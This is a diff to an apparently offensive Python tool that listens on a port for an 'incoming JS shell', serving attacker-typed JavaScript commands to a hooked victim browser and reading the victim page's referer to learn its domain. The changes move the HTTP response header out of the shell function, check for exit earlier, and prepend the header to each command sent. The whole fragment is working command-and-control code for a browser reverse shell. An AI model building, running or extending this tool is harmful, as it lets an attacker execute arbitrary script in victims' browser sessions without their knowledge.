@@ -63,27 +63,27 @@ if gene == True:
     
 print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
         
-
-def shell():
-    form = b'''HTTP/1.1 200 OK
+form = b'''HTTP/1.1 200 OK
 Content-Type: application/javascript
 Connection: close
 
 '''
+
+
+def shell():
     while 1:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind(('0.0.0.0', port))
         if secs != 0:
             s.settimeout(secs)
         buffer = input('%sjs-2.0%s$ ' % (red, white))
+        if buffer == 'exit' or buffer == 'quit':
+            break
         s.listen(2)
         try:
             c, a = s.accept()
             data = c.recv(1024)
-            if buffer == 'exit' or buffer == 'quit':
-                c.close()
-                break
-            elif buffer == 'domain':
+            if buffer == 'domain':
                 try:
                     print(domain)
                 except:
@@ -135,8 +135,8 @@ def main():
                 domain = referer.split('/')[2]
                 pth = '/'.join(referer.split('/')[3:])
         if len(cmd):
-            c.send(cmd.encode())
-            print('%s$ %s%s' % (blue, white, cmd))
+            c.send(form + cmd.encode())
+            print('%sjs-2.0%s$ %s' % (red, white, cmd))
         c.close()
         s.close()
         shell()
